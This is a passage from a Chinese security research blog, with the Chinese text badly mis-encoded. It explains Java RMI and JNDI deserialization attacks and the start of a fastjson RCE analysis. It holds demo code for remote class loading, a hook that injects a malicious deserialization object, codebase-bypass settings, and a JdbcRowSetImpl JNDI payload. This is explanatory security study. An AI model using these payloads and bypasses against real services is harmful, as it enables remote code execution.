02  a4 70 71 00 7e 00 43 71   .~...... .pq.~.Cq</span><br><span class="line">    00000900  00 7e 00 40 71 00 7e 00  35 71 00 7e 00 31 71 00   .~.@q.~. 5q.~.1q.</span><br><span class="line">    00000910  7e 00 11 73 71 00 7e 00  0b 02 00 00 04 68 70 74   ~..sq.~. .....hpt</span><br><span class="line">    00000920  00 27 6a 61 76 61 2e 75  74 69 6c 2e 63 6f 6e 63   .&#39;java.u til.conc</span><br><span class="line">    00000930  75 72 72 65 6e 74 2e 54  68 72 65 61 64 50 6f 6f   urrent.T hreadPoo</span><br><span class="line">    00000940  6c 45 78 65 63 75 74 6f  72 74 00 17 54 68 72 65   lExecuto rt..Thre</span><br><span class="line">    00000950  61 64 50 6f 6f 6c 45 78  65 63 75 74 6f 72 2e 6a   adPoolEx ecutor.j</span><br><span class="line">    00000960  61 76 61 74 00 09 72 75  6e 57 6f 72 6b 65 72 71   avat..ru nWorkerq</span><br><span class="line">    00000970  00 7e 00 10 71 00 7e 00  11 73 71 00 7e 00 0b 02   .~..q.~. .sq.~...</span><br><span class="line">    00000980  00 00 02 74 70 74 00 2e  6a 61 76 61 2e 75 74 69   ...tpt.. java.uti</span><br><span class="line">    00000990  6c 2e 63 6f 6e 63 75 72  72 65 6e 74 2e 54 68 72   l.concur rent.Thr</span><br><span class="line">    000009A0  65 61 64 50 6f 6f 6c 45  78 65 63 75 74 6f 72 24   eadPoolE xecutor$</span><br><span class="line">    000009B0  57 6f 72 6b 65 72 71 00  7e 00 4b 71 00 7e 00 35   Workerq. ~.Kq.~.5</span><br><span class="line">    000009C0  71 00 7e 00 10 71 00 7e  00 11 73 71 00 7e 00 0b   q.~..q.~ ..sq.~..</span><br><span class="line">    000009D0  02 00 00 03 42 70 74 00  10 6a 61 76 61 2e 6c 61   ....Bpt. .java.la</span><br><span class="line">    000009E0  6e 67 2e 54 68 72 65 61  64 74 00 0b 54 68 72 65   ng.Threa dt..Thre</span><br><span class="line">    000009F0  61 64 2e 6a 61 76 61 71  00 7e 00 35 71 00 7e 00   ad.javaq .~.5q.~.</span><br><span class="line">    00000A00  10 71 00 7e 00 11 73 72  00 1f 6a 61 76 61 2e 75   .q.~..sr ..java.u</span><br><span class="line">    00000A10  74 69 6c 2e 43 6f 6c 6c  65 63 74 69 6f 6e 73 24   til.Coll ections$</span><br><span class="line">    00000A20  45 6d 70 74 79 4c 69 73  74 7a b8 17 b4 3c a7 9e   EmptyLis tz...&lt;..</span><br><span class="line">    00000A30  de 02 00 00 70 78 70 78                            ....pxpx</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°ä¸€å † <code>ac ed 00 05</code>, å°±å¯ä»¥è¯æ˜æ¼æ´çš„æ¥æºäº†, åŸå› å°±æ˜¯ RMI åè®®æ˜¯åŸºäº java è‡ªå¸¦çš„åºåˆ—åŒ–çš„. å¦‚æœå‚æ•°ç±»å‹æ˜¯ Object, ç›´æ¥ä¼  payload å°±è¡Œäº†. å¦‚æœä¸æ˜¯ Object ä½†æ˜¯æ˜¯ç±»å‹æ˜¯æ¥å£, æˆ‘ä»¬å¯ä»¥é€šè¿‡ Proxy ç»™ ysoseiral çš„ payload å¥—ä¸€å±‚, ä¹Ÿèƒ½ç›´æ¥æ‰“æœåŠ¡ç«¯. ä¸è¿‡æ¯”è¾ƒéº»çƒ¦çš„æ˜¯ java çš„åŠ¨æ€ä»£ç†åªèƒ½ä»£ç† Interface, æ‰€ä»¥å¦‚æœå½¢å‚ç±»å‹æ˜¯ String, HashMap ç­‰å°±æ²¡åŠæ³•äº†. å¦å¤–å¯ä»¥çœ‹åˆ°å¼‚å¸¸ <code>java.lang.NullPointerException</code> æ˜¯æœåŠ¡æä¾›è€…å‘ç»™å®¢æˆ·ç«¯çš„, å¥½åƒæœ‰é€šè¿‡è¿™ç§æ–¹å¼å›æ˜¾æ¶ˆæ¯çš„æ‰“æ³•, ä¹Ÿæ˜¯å¾ˆéªšçš„.  </p><p>å¦å¤–å®é™…ä»¥å‰ä¸Šåœ¨ bind ç»™ <code>Registry</code> ç­‰ç­‰åœ°æ–¹éƒ½æ˜¯å¯ä»¥æ‰“çš„ (ysoseiral ä¹Ÿæœ‰å¯¹åº”çš„ payload), å› ä¸ºä¹Ÿéƒ½æ˜¯é€šè¿‡ååºåˆ—åŒ–ä¼ æ•°æ®, ä¸è¿‡åœ¨ä¸€æ¬¡æ›´æ–°ä¸­ java å®˜æ–¹åŠ äº†é™åˆ¶ (å¯ä»¥çœ‹å‚è€ƒæ–‡æ–‡ç«  [7]). åœ¨è¿™ç§åœ°æ–¹åªèƒ½ååºåˆ—åŒ–åœ¨ç™½åå•é‡Œé¢çš„ç±», ä¸è¿‡ä»ç„¶æ‰¾åˆ°äº†é€šè¿‡ JRMPClient çš„æ–¹æ³•æ¥æ‰“. å¯æƒœçš„æ˜¯æœ€æ–°ç‰ˆæœ¬æˆ‘æµ‹è¯•çš„æƒ…å†µæ˜¯ JRMPClient ä¹Ÿç»™ä¿®å¤äº†, å¯ä»¥æ”¶åˆ° Registry å‘çš„ JRMP è¯·æ±‚, ä½†æ˜¯ä¸èƒ½æˆåŠŸååºåˆ—åŒ–, ç”šè‡³è¿å¼‚å¸¸éƒ½æ²¡æœ‰, ä¼°è®¡ä»ç„¶æ˜¯ç™½åå•è¿‡æ»¤æ‰äº†. æ‰€ä»¥è¿™æ–¹é¢ç›®å‰åªèƒ½é€šè¿‡æˆ‘ä¸Šé¢çš„è¯´çš„å‚æ•°æ–¹å¼æ¥ååºåˆ—åŒ–æ‰“æœåŠ¡æä¾›è€…äº†.  </p><p>å¤§æ¦‚æ˜¯æ‰“å®¢æˆ·ç«¯:<br>ç›´æ¥æ”¹ ysoseiral.exploit.JRMPListener.java, è¿”å›æ¶æ„ gadgets å³å¯, è¿™åœ¨ JNDI lookup éƒ½æ—¶å€™ä¹Ÿå¯ä»¥ç”¨.  </p><p>æ‰“æ³¨å†Œå±€:<br>ç”¨ ysoseiral.exploit.RMIRegistryExploit.java + ç•¥å¾®ä¿®æ”¹è¿‡çš„ ysoseiral.exploit.JRMPClient.java.  </p><p>æ‰“æœåŠ¡æä¾›è€…:<br>æŠŠå‚æ•°ç”¨æ¶æ„å¯¹è±¡æ›¿æ¢å°±å¯ä»¥äº†, å¯¹å‚æ•°ç±»å‹æœ‰é™åˆ¶.  </p><p>Update:<br>çœ‹åˆ°äº†å›½å¤–çš„ç ”ç©¶, <a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a>  </p><p>å¯ä»¥é€šè¿‡ hook ç±»æ–¹æ³•æ¥ç›´æ¥æ›´æ”¹ä¼ è¿‡å»çš„å‚æ•°, ç»•è¿‡éƒ¨åˆ†çš„é™åˆ¶.  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title">unmarshalValue</span><span class="params">(Class&lt;?&gt; var0, ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var0.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (var0 == Integer.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readInt();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Boolean.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readBoolean();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Byte.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readByte();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Character.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readChar();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Short.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readShort();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Long.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readLong();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Float.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readFloat();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Double.TYPE) &#123;</span><br><span class="line">            <span class="keyword">return</span> var1.readDouble();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">"Unrecognized primitive type: "</span> + var0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> var0 == String.class &amp;&amp; var1 <span class="keyword">instanceof</span> ObjectInputStream ? SharedSecrets.getJavaObjectInputStreamReadString().readString((ObjectInputStream)var1) : var1.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªè¦ä¸æ˜¯ Interger, String ç­‰ç›´æ¥ç”¨å¯¹åº”æ–¹æ³•è¯»å‡ºçš„åŸå§‹ç±», å°±ç®—ä¸æ˜¯æ¥å£ç±»ä¹Ÿèƒ½é€šè¿‡è¿è¡Œæ—¶å¼ºè¡Œæ”¹å‚æ•°å»æ‰“, åˆšå¥½å¯ä»¥ç»“åˆä¹‹å‰å†™çš„ rasp å®Œæˆ.  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmb122.easyrasp.hooks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.rmb122.easyrasp.annotation.HookHandler;</span><br><span class="line"><span class="keyword">import</span> com.rmb122.easyrasp.enums.HookType;</span><br><span class="line"><span class="keyword">import</span> demo.rmb122.DeserializeObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestHook</span> </span>&#123;</span><br><span class="line">    <span class="meta">@HookHandler</span>(hookClass = <span class="string">"java.rmi.server.RemoteObjectInvocationHandler"</span>, hookMethod = <span class="string">"invokeRemoteMethod"</span>, hookType = HookType.BEFORE_RUN)</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object[] test(Object self, Object[] args) &#123;</span><br><span class="line">        System.out.println(<span class="string">"test"</span>);</span><br><span class="line">        System.out.println(Arrays.toString((Object[]) args[<span class="number">2</span>]));</span><br><span class="line">        ((Object[]) args[<span class="number">2</span>])[<span class="number">0</span>] = (Object) <span class="keyword">new</span> DeserializeObject();</span><br><span class="line">        <span class="keyword">return</span> args;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶å¼¹å‡ºå¼‚å¸¸è¯´ç±»å‹é”™è¯¯, ä½†å¯ä»¥æˆåŠŸè§¦å‘ååºåˆ—åŒ–.  </p><h2 id="åŠ è½½è¿œç¨‹ç±»"><a href="#åŠ è½½è¿œç¨‹ç±»" class="headerlink" title="åŠ è½½è¿œç¨‹ç±»"></a>åŠ è½½è¿œç¨‹ç±»</h2><p>RMIServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">"java.rmi.server.codebase"</span>, <span class="string">"http://127.0.0.1:19132/"</span>);</span><br><span class="line"></span><br><span class="line">        Registry reg = LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">        System.out.println(<span class="string">"java RMI registry created. port on 9999..."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            Thread.sleep(<span class="number">10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMIClient.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RMISecurityManager;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">"java.security.policy"</span>, RMIClient.class.getClassLoader().getResource(<span class="string">"java.policy"</span>).getFile());</span><br><span class="line">        RMISecurityManager securityManager = <span class="keyword">new</span> RMISecurityManager();</span><br><span class="line">        System.setSecurityManager(securityManager);</span><br><span class="line">        System.setProperty(<span class="string">"java.rmi.server.useCodebaseOnly"</span>, <span class="string">"false"</span>);</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line">        DeserializeObject deserializeObject = <span class="keyword">new</span> DeserializeObject();</span><br><span class="line">        registry.lookup(<span class="string">"test"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ Server è®¾ç½®ä¸€ä¸ª <code>java.rmi.server.codebase</code>, è¿™æ ·å®¢æˆ·ç«¯åœ¨ lookup æ—¶å‘ç°ç”¨åˆ°äº†ä¸€ä¸ªæœ¬åœ°ä¸å­˜åœ¨çš„ç±», ä¼šå»ä»è¿™ä¸ª codebase ä¸ŠåŠ è½½.<br>åœ¨æ–°ç‰ˆé‡Œé¢å·²ç»è¢«ä¿®å¤, åˆ©ç”¨èµ·æ¥å¯ä»¥ç”¨ <code>marshalsec</code>, æ›´æ–¹ä¾¿.  </p><h1 id="JDNI"><a href="#JDNI" class="headerlink" title="JDNI"></a>JDNI</h1><h2 id="ä¸-RMI-çš„å…³ç³»"><a href="#ä¸-RMI-çš„å…³ç³»" class="headerlink" title="ä¸ RMI çš„å…³ç³»"></a>ä¸ RMI çš„å…³ç³»</h2><p>JNDI å…¨å <code>Java Naming and Directory Interface</code>, å¯ä»¥çœ‹åˆ°å…¶å®å°±æ˜¯å°†å¤šç§åè®®, ä¾‹å¦‚è¿œç¨‹æ–¹æ³•è°ƒç”¨ (RMI), å…¬å…±å¯¹è±¡è¯·æ±‚ä»£ç†ä½“ç³»ç»“æ„ (CORBA), è½»å‹ç›®å½•è®¿é—®åè®® (LDAP) æˆ–åŸŸåæœåŠ¡ (DNS). å…¨éƒ¨å°è£…åˆ°ä¸€ä¸ªæ¥å£ä¸­, æ–¹ä¾¿ä½¿ç”¨.  </p><p>æ‰€ä»¥ä»¥ä¸‹ä»£ç :  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDI</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Context context = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        TestObject object = (TestObject) context.lookup(<span class="string">"rmi://localhost:9999/test"</span>);</span><br><span class="line">        object.callMe(<span class="keyword">new</span> DummyImpl());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ RMIClient æ˜¯å®Œå…¨ä¸€æ ·çš„.<br>ä¸åŒçš„æ˜¯ JNDI åœ¨è¿™åŸºç¡€ä¸ŠåŠ äº†ä¸å°‘åŠŸèƒ½, </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">10000</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"test"</span>,<span class="string">"com.rmb122"</span>, <span class="string">"http://127.0.0.1:19133/"</span>);</span><br><span class="line">        ReferenceWrapper wrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.rebind(<span class="string">"wrapper"</span>, wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚è¿™ä¸ª Reference, å®¢æˆ·ç«¯æŸ¥è¯¢ wrapper æ—¶, å› ä¸ºæ˜¯ <code>Reference</code> ä¸” com.rmb122 è¿™ä¸ªå·¥å‚ç±»ä¸å­˜åœ¨, å°†ä¼šå» codebase <code>http://127.0.0.1:19133/</code> ä¸ŠåŠ è½½, åˆ©ç”¨æ–¹å¼ä¸ rmi è¿œç¨‹å¯¹è±¡åŠ è½½æ˜¯ä¸€æ ·çš„.<br>åœ¨æ–°ç‰ˆä¸­å·²ç»ä¿®å¤, éœ€è¦æ‰‹åŠ¨æ‰“å¼€ <code>System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);</code>. è€Œä¸”åœ¨æˆ‘äº²æµ‹çš„æ—¶å€™, å°±ç®—æ‰“å¼€ä¹Ÿæ²¡ç”¨äº†, è¿”å›çš„æ˜¯ <code>Reference</code> å¯¹è±¡ 233. Debug äº†ä¸€ä¸‹å‘ç°è¿˜éœ€è¦æ‰“å¼€ <code>com.sun.jndi.ldap.object.trustURLCodebase</code>, è¿™æ‰ä¼šçœŸæ­£å»ç”¨ http åè®®åŠ è½½ç±». åŒæ—¶å› ä¸ºè¿™æ˜¯ JNDI åŠ çš„å†…å®¹, å¯¹ RMIClient æ˜¯æ— æ•ˆçš„. ä¼šç›´æ¥è¿”å› Reference å¯¹è±¡.  </p><h2 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI + LDAP"></a>JNDI + LDAP</h2><p>è¿™å…¶å®ä¸ RMI å·®ä¸å¤š, å°±æ˜¯æ¢äº†å£³, ä¸åŒçš„åœ°æ–¹æ˜¯ ldap æ˜¯æœ‰ç´¢å¼•ç­‰æ¦‚å¿µçš„, å¯ä»¥æœç´¢å•Šä¹‹ç±»çš„, ä¸”è¿”å›çš„å¯¹è±¡ä¹Ÿæ¯”è¾ƒå¤æ‚, æœ¬èº«å°±é¢å¤–å¥—äº†ä¸€å±‚, æœ‰ä¸€äº›ç‰¹æ®Šçš„å±æ€§. å…·ä½“å¯ä»¥çœ‹çœ‹åº•ä¸‹çš„å‚è€ƒèµ„æ–™.<br>å…¶ä¸­å€¼å¾—ä¸€è¯´çš„æ˜¯æœ‰ä¸ªå±æ€§å¯ä»¥é™„å¸¦ååºåˆ—åŒ–å¯¹è±¡, å¯ä»¥ç”¨äºé«˜ç‰ˆæœ¬ jre ä¸‹çš„ fastjson æ‰“æœ¬åœ°ååºåˆ—åŒ– gadget.  </p><h2 id="æœ¬åœ°-Class-ä½œä¸º-Reference-Factory"><a href="#æœ¬åœ°-Class-ä½œä¸º-Reference-Factory" class="headerlink" title="æœ¬åœ° Class ä½œä¸º Reference Factory"></a>æœ¬åœ° Class ä½œä¸º Reference Factory</h2><p>ä¸Šé¢çš„æ˜¯ Reference æ˜¯ <code>Reference(&quot;MyClass&quot;,&quot;com.rmb122&quot;, &quot;http://127.0.0.1:19133/&quot;);</code>, ç¬¬äºŒä¸ªå…¶å®å°±æ˜¯å·¥å‚ç±», è¿™é‡Œå¯ä»¥åˆ©ç”¨ <code>org.apache.naming.factory.BeanFactory</code> è¿™ä¸ªå·¥å‚ç±»æ¥é…åˆ, ç»•è¿‡è¿œç¨‹åŠ è½½çš„é™åˆ¶. è¯¦ç»†å¯ä»¥çœ‹çœ‹å‚è€ƒèµ„æ–™ [3].  </p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å¤§æ¦‚å¦‚ä¸‹:<br>RMI remote codebase:<br>éœ€è¦ <code>java.rmi.server.useCodebaseOnly=true</code> ä¸”éœ€è¦è®¾ç½® SecurityManager, æ¯”è¾ƒä¸å®ç”¨  </p><p>RMI æ‰“ Service Provider:<br>å¦‚æœå·²çŸ¥ä¸€ä¸ªæ¥å£å£°æ˜, å¤§éƒ¨åˆ†æƒ…å†µä¸‹å¯ä»¥æ‰“.  </p><p>RMI æ‰“ Registry:<br>è€ç‰ˆæœ¬ç›´æ¥ç”¨ ysoserial çš„ payload æ‰“, æ–°ç‰ˆæœ¬å¯ä»¥å°è¯•ç”¨ JRMP Client çš„ payload æ”¹ä¸€æ”¹å°è¯•ç»•è¿‡.  </p><p>JNDI + RMI lookup Reference:<br><code>com.sun.jndi.rmi.object.trustURLCodebase=false</code> ç›´æ¥çˆ†å‡ºå¼‚å¸¸<br><code>com.sun.jndi.ldap.object.trustURLCodebase=false</code> è¿”å› Reference å¯¹è±¡<br>å¦‚æœè¦åˆ©ç”¨éœ€è¦ä¸¤ä¸ªé€‰é¡¹éƒ½ =true  </p><p>JNDI + LDAP lookup Reference:<br><code>com.sun.jndi.rmi.object.trustURLCodebase=false</code> æ— å½±å“<br><code>com.sun.jndi.ldap.object.trustURLCodebase=false</code> è¿”å› Reference å¯¹è±¡<br>åªéœ€è¦ com.sun.jndi.ldap.object.trustURLCodebase=true å³å¯åˆ©ç”¨  </p><p>JNDI + LDAP æ‰“æœ¬åœ°ååºåˆ—åŒ–, æˆ–è€… RMI ååºåˆ—åŒ–:<br>ç›®å‰æ— é™åˆ¶  </p><p>JNDI + LDAP æ‰“æœ¬åœ° Reference Factory:<br>ç›®å‰æ— é™åˆ¶  </p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://paper.seebug.org/1091/" target="_blank" rel="noopener">https://paper.seebug.org/1091/</a><br>[2] <a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">https://kingx.me/Exploit-Java-Deserialization-with-RMI.html</a><br>[3] <a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a><br>[4] <a href="https://stackoverflow.com/questions/817853/what-is-the-difference-between-serializable-and-externalizable-in-java" target="_blank" rel="noopener">https://stackoverflow.com/questions/817853/what-is-the-difference-between-serializable-and-externalizable-in-java</a><br>[5] <a href="https://www.cnblogs.com/Welk1n/p/11066397.html" target="_blank" rel="noopener">https://www.cnblogs.com/Welk1n/p/11066397.html</a><br>[6] <a href="http://www.yulegeyu.com/2018/12/04/JNDI-Injection-Via-LDAP-Deserialize/" target="_blank" rel="noopener">http://www.yulegeyu.com/2018/12/04/JNDI-Injection-Via-LDAP-Deserialize/</a><br>[7] <a href="http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/" target="_blank" rel="noopener">http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/</a><br>[8] <a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/" target="_blank" rel="noopener">http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/</a>  </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RMI / JNDI åœ¨ååºåˆ—åŒ–, fastjson æ¼æ´åˆ©ç”¨çš„æ—¶å€™éƒ½ç»å¸¸å‡ºç°, å­¦ä¹ ä¸€ä¸‹.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="java" scheme="https://rmb122.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>fastjson RCE åˆ†æ</title>
    <link href="https://rmb122.com/2020/02/01/fastjson-RCE-%E5%88%86%E6%9E%90/"/>
    <id>https://rmb122.com/2020/02/01/fastjson-RCE-%E5%88%86%E6%9E%90/</id>
    <published>2020-02-01T10:18:25.000Z</published>
    <updated>2020-05-29T04:33:33.101Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>å…ˆçœ‹ç»å…¸ payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"rmi://localhost:1099/Exploit"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>ç®€å•æ¥è¯´åŸå› æ˜¯ fastjson æ”¯æŒååºåˆ—ç±», å¹¶é€šè¿‡ setter, getter çš„æ–¹å¼æ¥ä¸ºç±»è®¾ç½®å±æ€§, æ¯”å¦‚ <code>dataSourceName</code> å°±ä¼šè°ƒç”¨ <code>setDataSourceName(&quot;rmi://localhost:1099/Exploit&quot;)</code>, è€Œæœ‰äº›ç±»åœ¨ setter ä¹‹ä¸­, å¯èƒ½æœ‰äº›å‰¯ä½œç”¨. 